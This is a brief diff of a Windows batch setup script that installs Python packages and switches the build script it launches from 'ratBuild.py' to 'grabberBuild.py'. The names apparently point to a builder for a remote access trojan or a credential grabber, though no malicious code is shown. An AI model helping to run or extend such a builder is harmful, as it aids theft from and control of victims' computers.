@@ -3,4 +3,4 @@
 
 @echo off
 python -m pip install requests colorama pystyle pywin32
-python ratBuild.py
+python grabberBuild.py
